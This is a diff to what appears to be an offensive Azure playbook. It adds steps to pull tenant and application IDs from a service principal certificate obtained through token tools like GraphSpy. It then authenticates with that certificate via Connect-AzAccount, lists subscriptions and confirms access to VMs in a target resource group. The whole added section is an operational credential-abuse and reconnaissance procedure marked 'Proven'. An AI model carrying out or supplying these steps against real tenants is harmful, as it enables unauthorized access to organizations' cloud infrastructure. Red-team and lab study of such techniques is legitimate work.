@@ -154,29 +154,65 @@ cd /tmp && python3 -m http.server 8080
 
 ## Step 3: Authenticate
 
-### SP Certificate Auth (Proven)
+### 3a: Find Tenant ID and Client ID from PFX
+
+The PFX cert file you downloaded contains the SP info. Extract it:
+
+```bash
+# Read the PFX cert subject/issuer to find the App Name
+openssl pkcs12 -in AzureAppCert.pfx -nokeys -clcerts 2>/dev/null | openssl x509 -subject -issuer -noout
+
+# The cert filename often contains a thumbprint (e.g., AzureAppCert_5b03c63c39874fa8ace73afd6a9c9877.cer)
+# The .cer file next to the PFX has the same info
+```
+
+**From Meatball / GraphSpy UI:**
+- Go to **Tokens** page → find the SP token you used to download the cert
+- The token shows `tenant_id` and `client_id` (Application ID)
+- Or check **Recon > Applications** to see all SP registrations
+
+**From Azure Portal (if you have access):**
+- App Registrations → find the app → copy Application (client) ID
+- Overview → Directory (tenant) ID
+
+### 3b: SP Certificate Auth (Proven)
+
+```bash
+# cd to where you downloaded the PFX
+cd ~/Downloads   # or wherever your PFX is
+```
 
 ```powershell
-$TenantId = "YOUR_TENANT_ID"
-$AppId = "YOUR_APP_ID"
-$PfxPath = "./AzureAppCert.pfx"
-$PfxPass = ConvertTo-SecureString -String "PASSWORD" -AsPlainText -Force
+# Set your values (found from step 3a)
+$TenantId = "YOUR_TENANT_ID"       # e.g., "527c0d4b-2722-4f04-b9ed-7b13ed039ecb"
+$AppId = "YOUR_APP_ID"             # e.g., "9d1e53c7-28f6-4d1d-8d8a-1abeb4db2888"
+$PfxPath = "./AzureAppCert.pfx"    # path to your PFX file
+$PfxPass = ConvertTo-SecureString -String "" -AsPlainText -Force  # empty if no password
 
 Connect-AzAccount -ServicePrincipal -Tenant $TenantId -ApplicationId $AppId `
   -CertificatePath $PfxPath -CertificatePassword $PfxPass
+
+# Verify
+Get-AzContext | Format-List Name, Tenant, Subscription
 ```
 
-### SP Secret Auth
+### 3c: SP Secret Auth (Alternative)
 
 ```powershell
 $cred = New-Object PSCredential("CLIENT_ID", (ConvertTo-SecureString "SECRET" -AsPlainText -Force))
 Connect-AzAccount -ServicePrincipal -Credential $cred -TenantId "TENANT_ID"
 ```
 
-### Set Subscription
+### 3d: Set Subscription + Verify VMs
 
 ```powershell
+# List available subscriptions
+Get-AzSubscription | Format-Table Name, Id, State
+
+# Set the target subscription
 Set-AzContext -SubscriptionId "SUBSCRIPTION_ID"
+
+# Verify you can see VMs
 Get-AzVM -ResourceGroupName "RGCORPSERVERS" | Format-Table Name, Location
 ```
 
